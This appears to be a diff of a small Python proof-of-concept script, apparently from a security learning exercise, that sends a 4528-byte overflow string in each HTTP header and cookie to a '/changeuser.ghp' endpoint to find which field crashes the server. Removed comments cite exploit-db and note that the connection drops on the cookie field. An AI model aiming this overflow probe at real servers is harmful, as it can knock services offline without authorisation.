@@ -1,10 +1,10 @@
+'''
 import requests
-import copy  # copy 라이브러리
+import copy
 
-host = "http://@.@.@.@"  # Insert your IP
-uri = "/changeusers.ghp"
+host = "http://172.30.1.8"
+uri = "/changeuser.ghp"
 
-# Json type
 org_headers = {
     "User-Agent": "Mozilla/4.0",
     "Host": host.split("://")[1],
@@ -21,7 +21,7 @@ org_cookies = {
     "PassWD": "password"
 }
 
-payload = "A" * 4528  # Bug!! ::exploit.db
+payload = "A" * 4528
 
 for key in list(org_headers.keys()):
     print("Header", key, end=": ")
@@ -33,7 +33,6 @@ for key in list(org_headers.keys()):
     except Exception as e:
         print(e[:10])
 
-# 실행시 쿠키값과 관련된 부분에서 에러가 발생하여 호스트와의 연결이 끊어졌음을 알 수 있다.
 for key in list(org_cookies.keys()):
     print("Cookie", key, end=": ")
     try:
@@ -43,3 +42,4 @@ for key in list(org_cookies.keys()):
         print(": Good!")
     except Exception as e:
         print(e[:10])
+'''
